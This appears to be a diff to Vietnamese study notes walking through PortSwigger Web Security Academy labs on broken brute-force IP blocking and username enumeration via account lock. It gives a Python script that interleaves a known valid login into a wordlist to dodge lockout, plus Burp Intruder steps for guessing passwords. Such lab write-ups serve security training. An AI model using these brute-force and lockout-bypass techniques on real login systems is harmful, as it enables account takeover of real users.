@@ -96,6 +96,67 @@ username=u&password=p
     - Start attack, quan sát request trả về status code **302** là request chứa **username** và **password** chính xác
 - Đăng nhập 
 
+### Lab: Broken brute-force protection, IP block
+#### Analysis
+- Login với tài khoản `wiener` và gửi tới **Burp Repeater**, và logout
+- Login với tài khoản `carlos` với mật khẩu ngẫu nhiên và gửi tới **Burp Repeater**
+- Login với tài khoản `carlos` nhiều lần với mật khẩu ngẫu nhiên, đến lần thứ 4 ta thấy đã bị block trong 1p
+- Chờ hết thời gian 1p, login bằng tài khoản `carlos` 2 lần với mật khẩu ngẫu nhiên, lần thứ 3 login bằng tài khoản `wiener`, sau đó login lại bằng tài khoản `carlos` với mật khẩu ngẫu nhiên => Không bị block nữa
+- Cho thấy ứng dụng sẽ không block địa chỉ **IP** nếu login lần 3 thành công
+
+#### Exploit
+- Ý tưởng: Tạo danh sách **username** và **password** tương ứng sau 2 lần login bằng tài khoản `carlos` sẽ login bằng tài khoản `wiener` rồi tiếp tuc login 2 lần bằng tài khoản `carlos`
+
+```python
+with open("passwords.txt", "r") as f:
+    lines = f.read().splitlines()
+
+with open("passwords_custom.txt", "w") as p, open("usernames_custom.txt", "w") as u:
+    for i, line in enumerate(lines):
+        p.write(f"{line}\n")
+        u.write("carlos\n")
+        if (i + 1) % 2 == 0:
+            p.write("peter\n")
+            u.write("wiener\n")
+```
+- Sử dụng code trên để tạo danh sách **username** và **password** dựa trên danh sách **password** có sẵn
+
+```http
+POST /login HTTP/2
+Host: 0af100c2043a683a8071e941009a00bd.web-security-academy.net
+...
+username=u&password=p
+```
+- Gửi request đến **Burp Intruder**
+- Add ở vị trí `u` và `p` 
+- Chọn mode `Pitchfork` để tấn công song song theo danh sách
+- Nếu sử dụng bản **BurpSuite Pro**, cần phải chỉnh **resource pool** với **concurrent** là 1 để các request được thực hiện tuyến tính, đúng với quy trình quét
+- Xóa `u` và `p` đi để nó bỏ qua, vì request đầu tiên chứa `u` và `p` dẫn đễ logic không hợp lý
+- Start atack, kiểm tra request có tên `carlos` và có length nhỏ thì chính là tài khoản của `carlos`
+- Login
+
+### Lab: Username enumeration via account lock
+#### Analysis
+- Đăng nhập và gửi request tới **Burp Intruder**
+
+```http
+POST /login HTTP/2
+Host: 0af100c2043a683a8071e941009a00bd.web-security-academy.net
+...
+username=u&password=p
+```
+- Add tại vị trí `u` và `p`
+- Lấy danh sách username và password được cấp và thực hiện tấn công ở mode **Clustor boom attack**
+- Quan sát ta thấy request nào chứa response dưới đây tức tài khoản này tồn tại, vì vậy ứng dụng mới block nó sau nhiều lần gửi request login bằng tài khoản đó.
+
+```
+You have made too many incorrect login attempts. Please try again in 1 minute(s).
+```
+#### Exploit
+- Dùng request trên nhưng add tại `p`, vì ta đã biết username là ai
+- Thực hiện tấn công với danh sách password được cấp với mode **Snifer attack**
+- Login 
+
 
 ## Prevent
 ---
